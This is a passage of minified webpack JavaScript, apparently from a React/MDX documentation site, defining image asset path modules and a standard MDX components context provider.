a=s.p+"assets/images/image_20250421-232104-aeb951b5735996234f61cc0f08d9b508.png"},41445:(e,n,s)=>{s.d(n,{A:()=>a});const a=s.p+"assets/images/image_20250459-225955-0a73223433b3f186e41cf05bb06ce280.png"},28453:(e,n,s)=>{s.d(n,{R:()=>o,x:()=>i});var a=s(96540);const t={},r=a.createContext(t);function o(e){const n=a.useContext(r);return a.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function i(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(t):e.components||t:o(e.components),a.createElement(r.Provider,{value:n},e.children)}}}]);